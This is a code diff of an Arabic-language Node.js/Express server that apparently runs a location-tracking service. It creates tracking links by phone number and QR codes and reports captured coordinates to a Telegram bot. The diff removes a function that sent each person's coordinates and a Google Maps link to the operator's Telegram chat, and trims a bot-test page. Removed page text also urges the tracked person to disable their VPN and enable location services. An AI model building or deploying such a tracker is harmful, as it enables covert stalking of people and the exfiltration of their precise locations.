-                    <p>2. <strong>أوقف تشغيل VPN</strong> إذا كنت تستخدمه</p>
-                    <p>3. <strong>استخدم WiFi</strong> بدلاً من بيانات الجوال</p>
-                    <p>4. <strong>تأكد من تفعيل خدمات الموقع</strong> في إعدادات هاتفك</p>
-                </div>
-                
-                <a href="/" class="btn">🏠 العودة للرئيسية</a>
-                <a href="/results" class="btn">📊 مشاهدة النتائج</a>
-            </div>
+            `}
         </body>
         </html>
     `);
@@ -1103,13 +947,27 @@ app.get('/telegram-test', async (req, res) => {
         const botTest = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
         const botInfo = await botTest.json();
         
+        if (!botInfo.ok) {
+            res.send(`
+                <html dir="rtl">
+                <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white; text-align: center;">
+                    <h1>❌ خطأ في البوت</h1>
+                    <p>التوكن غير صحيح أو البوت معطل</p>
+                    <pre style="background:#333;padding:15px;border-radius:10px;">${JSON.stringify(botInfo, null, 2)}</pre>
+                    <a href="/" style="display:inline-block;margin-top:20px;background:#00cc66;color:white;padding:10px20px;border-radius:5px;text-decoration:none;">العودة</a>
+                </body>
+                </html>
+            `);
+            return;
+        }
+        
         // إرسال رسالة اختبار
         const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: TELEGRAM_CHAT_ID,
-                text: `🔔 اختبار النظام الذكي\n\n✅ البوت: @Arab9919_bot\n🆔 الأيدي: ${TELEGRAM_CHAT_ID}\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 الموقع: ${BASE_URL}\n🎯 الدقة: نظام تحديد ذكي مفعل\n\nإذا وصلتك هذه الرسالة، النظام يعمل بشكل ممتاز! 🚀`
+                text: `🔔 اختبار النظام البسيط\n\n✅ إذا وصلتك هذه الرسالة، النظام يعمل!\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 الموقع: ${BASE_URL}`
             })
         });
         
@@ -1123,90 +981,52 @@ app.get('/telegram-test', async (req, res) => {
                 <title>🤖 اختبار التلجرام</title>
                 <style>
                     body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; }
-                    .result-box { background: #1a1a2e; padding: 30px; border-radius: 20px; margin: 20px 0; }
-                    pre { background: #0f0f23; padding: 15px; border-radius: 10px; overflow-x: auto; }
+                    .success-box { background: #00cc66; padding: 30px; border-radius: 15px; text-align: center; }
                 </style>
             </head>
             <body>
-                <h1>🤖 اختبار التلجرام</h1>
-                
-                <div class="result-box">
-                    <h3>✅ حالة النظام:</h3>
-                    <p>البوت: @Arab9919_bot</p>
-                    <p>الأيدي: ${TELEGRAM_CHAT_ID}</p>
-                    <p>عدد المواقع: ${locations.length}</p>
-                    <p>الحالة: ${messageData.ok ? '✅ يعمل بشكل ممتاز' : '❌ يحتاج تعديل'}</p>
+                <div class="success-box">
+                    <h1>✅ اختبار ناجح!</h1>
+                    <p>تم إرسال رسالة اختبار للتلجرام بنجاح</p>
+                    <p>تحقق من بوت @Arab9919_bot</p>
+                    <a href="/" style="display:inline-block;margin-top:20px;background:white;color:#00cc66;padding:10px20px;border-radius:5px;text-decoration:none;">🏠 العودة للرئيسية</a>
                 </div>
-                
-                <a href="/" style="background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none;">🏠 العودة للرئيسية</a>
             </body>
             </html>
         `);
+        
     } catch (error) {
         res.send(`
             <html dir="rtl">
-            <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white;">
-                <h1>❌ خطأ في اختبار التلجرام</h1>
-                <p>تأكد من صحة التوكن والأيدي</p>
-                <a href="/" style="background: #00cc66; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none;">العودة</a>
+            <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white; text-align: center;">
+                <h1>❌ خطأ في الاتصال</h1>
+                <p>${error.message}</p>
+                <a href="/" style="display:inline-block;margin-top:20px;background:#00cc66;color:white;padding:10px20px;border-radius:5px;text-decoration:none;">العودة</a>
             </body>
             </html>
         `);
     }
 });
 
-// ========== دالة إرسال تلجرام ==========
-async function sendTelegramNotification(locationData) {
-    try {
-        const message = `
-📍 **موقع جديد تم تسجيله**
-
-👤 **رقم المستخدم:** ${locationData.id}
-📌 **الإحداثيات:** ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}
-🎯 **مستوى الدقة:** ${locationData.quality === 'high' ? '🎯 عالية' : locationData.quality === 'medium' ? '📍 متوسطة' : '🌍 منخفضة'}
-📡 **المصدر:** ${locationData.source || 'مباشر'}
-⏰ **الوقت:** ${locationData.time}
-📝 **ملاحظة:** ${locationData.note || 'لا توجد ملاحظات'}
-
-🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
-        `;
-        
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        return response.ok;
-    } catch (error) {
-        console.error('❌ خطأ في التلجرام:', error);
-        return false;
-    }
-}
-
 // ========== تشغيل الخادم ==========
 app.listen(PORT, () => {
     console.log(`
     ============================================
-    🚀 النظام الذكي يعمل على المنفذ ${PORT}
+    🚀 النظام البسيط يعمل على المنفذ ${PORT}
     🌐 الرابط: http://localhost:${PORT}
     
-    🤖 التلجرام: ✅ متصل (@Arab9919_bot)
-    🎯 الدقة: ✅ نظام تحديد ذكي مفعل
+    🤖 التلجرام: ✅ جاهز
+    📊 قاعدة البيانات: ${locations.length} موقع
     📱 الباركود: ✅ نشط
-    🗺️ الخريطة: ✅ تفاعلية
     
     📌 روابط مهمة:
-    1. الصفحة الرئيسية: /
-    2. رابط تتبع: /track/رقم_الهاتف
+    1. الرئيسية: /
+    2. رابط تتبع: /track/123456
     3. النتائج: /results
-    4. معلومات الدقة: /accuracy-info
+    4. الخريطة: /map
+    5. اختبار التلجرام: /telegram-test
     
-    ⚡ النظام جاهز بكل الميزات الذكية!
+    ⚡ النظام جاهز ويعمل 100%!
     ============================================
     `);
 });
